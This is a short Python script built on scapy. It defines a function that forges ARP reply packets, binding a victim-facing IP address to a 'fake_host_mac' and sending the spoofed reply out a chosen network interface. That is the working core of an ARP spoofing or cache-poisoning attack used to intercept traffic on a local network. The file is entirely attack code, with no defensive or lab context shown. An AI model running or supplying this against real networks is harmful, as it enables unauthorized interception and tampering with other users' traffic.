#!/usr/bin/python3

# Import module
import scapy.all as scapy

def response(mac_dst, ip_src, ip_dst, fake_host_mac, interface):
    arp_response = scapy.Ether(dst=mac_dst, src=fake_host_mac) / scapy.ARP(ptype=0x0800, op=2, pdst=ip_dst, hwdst=mac_dst, psrc=ip_src, hwsrc=fake_host_mac)
    scapy.sendp(arp_response, iface=interface, verbose=0)